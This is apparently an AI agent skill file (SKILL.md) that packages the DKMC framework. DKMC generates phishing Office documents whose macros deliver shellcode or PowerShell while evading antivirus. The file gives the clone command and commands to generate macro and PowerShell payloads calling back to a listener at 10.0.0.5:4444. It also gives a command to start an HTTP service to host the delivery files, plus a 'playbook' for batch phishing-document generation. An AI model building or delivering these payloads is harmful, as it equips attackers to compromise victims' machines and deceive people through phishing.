---
name: dkmc-macro-gen
description: "DKMC: phishing document batch generation. Signals: malware development, evasion development, macro delivery generation, HTTP service delivery."
zh-signals: "DKMC: 钓鱼文档批量生成。信号:恶意软件开发,免杀开发,生成宏投递,起 HTTP 服务投递。"
when-to-use: >-
  Use when building phishing document payloads that deliver shellcode or
  PowerShell through Office macros, and when you need a built-in HTTP service to
  host the delivery files.
---

# DKMC

- Attack Category: C45 AV Evasion and Payload Delivery
- Upstream Repository: https://github.com/Mr-Un1k0d3r/DKMC
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/Mr-Un1k0d3r/DKMC && cd DKMC
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python dkmc.py` | Interactively generate a shellcode delivery package |
| `generate -i 10.0.0.5 -p 4444 -t macro` | Generate a macro delivery |
| `generate ... -t powershell` | Generate a PowerShell delivery |
| `deploy` | Start an HTTP service for delivery |

## Attack Scenario Playbook

### Phishing Document Batch Generation

```bash
python dkmc.py
# payload → encode → embed into an Office document, with the detection rate of each antivirus selectable in real time
```

## Notes

Don't Kill My Cat, a malicious macro/script generation framework with an interactive multi-step build for AV evasion.
